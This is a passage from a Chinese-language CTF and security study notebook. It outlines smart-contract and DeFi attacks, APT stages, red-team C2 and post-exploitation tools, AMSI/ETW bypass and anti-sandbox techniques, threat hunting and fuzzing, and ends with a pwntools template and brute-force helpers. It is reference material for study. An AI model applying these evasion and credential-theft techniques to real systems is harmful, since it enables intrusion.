**经典漏洞：**
- Reentrancy (重入)
- Integer Overflow/Underflow
- Access Control
- Front-running
- Timestamp Dependency
- tx.origin

**工具：**
- `Mythril` - 智能合约审计
- `Slither` - 静态分析
- `Echidna` - 模糊测试
- `Foundry` - 测试框架

---

### DeFi 攻击

**Flash Loan 攻击：**
- 无抵押借贷
- 套利
- 价格操纵

**Oracle 操纵：**
- Chainlink 预言机滥用
- TWAP 攻击

---

### 51% 攻击

**PoW 区块链：**
- 控制超过 50% 算力
- 双重支付
- 交易回滚

**PoS 区块链：**
- Nothing-at-stake
- Long-range attack
- Short-range attack

---

## 智能合约审计

### Solidity 最佳实践

```solidity
// ✅ 正确的支付模式
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0);
    balances[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}

// ✅ 使用 SafeMath 或 Solidity 0.8+
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
using SafeMath for uint256;
```

### 常见漏洞检查清单
- [ ] 重入漏洞
- [ ] 整数溢出
- [ ] 访问控制
- [ ] 未初始化的存储指针
- [ ] DoS 风险
- [ ] Gas 优化
- [ ] 中心化风险
- [ ] 硬编码密钥

---

## APT 攻击与红队

### APT 攻击链

**常见阶段：**
1. **初始访问** - 钓鱼、漏洞利用、供应链
2. **执行** - 恶意代码执行
3. **持久化** - 后门、计划任务
4. **权限提升** - 内核漏洞、配置错误
5. **防御规避** - 反沙箱、混淆
6. **凭据访问** - Mimikatz、LSASS 转储
7. **横向移动** - SMB、WMI、RDP
8. **收集** - 敏感数据搜集
9. **命令控制** - C2 通信
10. **渗出** - 数据外传

---

### 红队工具

**C2 框架：**
- Cobalt Strike
- Sliver
- Empire
- Havoc
- Mythic

**漏洞利用：**
- Metasploit Framework
- BeEF (Browser Exploit Framework)
- Responder (LLMNR/NBT-NS)

**后渗透：**
- BloodHound (AD 分析)
- CrackMapExec (内网横向)
- ADExplorer (AD 枚举)
- Seatbelt (系统枚举)

---

### 防御规避

**AMSI Bypass：**
- PowerShell 脚本绕过
- 内存补丁
- 反射注入

**ETW Bypass：**
- 事件追踪禁用
- 系统调用拦截

**反沙箱：**
- 虚拟机检测
- 延迟执行
- 用户交互检查

---

## 威胁情报

### IOC (Indicators of Compromise)

**类型：**
- Hash (文件/URL)
- IP 地址
- 域名
- URL/URI
- Email 地址
- 证书指纹
- 注册表键值

**格式：**
- STIX (Structured Threat Information Expression)
- TAXII (Trusted Automated eXchange of Intelligence)
- MISP (Malware Information Sharing Platform)

---

### 威胁猎手 (Threat Hunting)

**技术：**
- 基于假设的狩猎
- 遥测数据分析
- 行为模式识别
- 异常检测

**工具：**
- Velociraptor
- Mimir
- OpenSearch Security
- Sigma (规则语言)

---

## 安全研究

### 模糊测试 (Fuzzing)

**分类：**
- Dumb fuzzer
- Coverage-guided fuzzer (AFL, libFuzzer)
- Structure-aware fuzzer (American Fuzzy Lop)
- Network fuzzer (boofuzz)

**工具：**
- AFL (American Fuzzy Lop)
- libFuzzer
- honggfuzz
- OSS-Fuzz

---

### 符号执行

**概念：**
- 将程序符号化
- 探索所有执行路径
- 约束求解器 (SMT)

**工具：**
- KLEE
- angr
- Triton
- Symbolic Execution Framework (SEF)

---

### 程序分析

**静态分析：**
- 控制流分析
- 数据流分析
- 指针分析
- 污点分析 (Taint Analysis)

**动态分析：**
- 插桩 (Instrumentation)
- 执行跟踪
- 内存监视

---

## 实战技巧

### Python CTF 脚本模板

```python
#!/usr/bin/env python3
import requests
import hashlib
from pwn import *

context.log_level = 'info'

def solve():
    # 连接或HTTP请求
    r = remote('host', 12345)
    # r = requests.get('http://url')
    
    while True:
        try:
            line = r.recvline().decode()
            print(f"Received: {line}")
            
            # 处理逻辑
            # ...
            
            # 发送响应
            r.sendline(b"answer")
            
        except EOFError:
            print("Connection closed")
            break
        except Exception as e:
            print(f"Error: {e}")
            break
    
    r.close()

if __name__ == '__main__':
    solve()
```

### 常用 Python 工具函数

```python
# 字符串异或
def xor(s1, s2):
    return bytes(a ^ b for a, b in zip(s1, s2))

# ROT13
import codecs
codecs.decode("text", "rot_13")

# 所有编码组合
def try_all_encodings(data):
    encodings = ['utf-8', 'latin-1', 'gbk', 'shift_jis']
    for enc in encodings:
        try:
            return data.decode(enc)
        except:
            continue
    return None

# 暴力破解
def brute_force(charset, length):
    from itertools import product
    for p in product(charset, repeat=length):
        yield ''.join(p)

# 多线程爆破
import threading
def parallel_brute(func, candidates, threads=4):
    lock = threading.Lock()
    result = []
    
    def worker(candidates_chunk):
        for candidate in candidates_chunk:
            if func(candidate):
                with lock:
                    result.append(candidate)
                return True
        return False
    
    chunks = [candidates[i::threads] for i in range(threads)]
    workers = [threading.Thread(target=worker, args=(chunk,)) for chunk in chunks]
    
    for w in workers:
        w.start()
    for w in workers:
        w.join()
    
    return result
```

---

## 更新日志
- 2026-03-28: 创建 CTF 知识库
- 2026-03-28: 添加中文资源、解题思路、模板
- 2026-03-28: 添加高级Web、云安全、IoT、高级密码学、网络安全、内核漏洞、侧信道、AI安全、区块链、APT攻击、威胁情报、安全研究
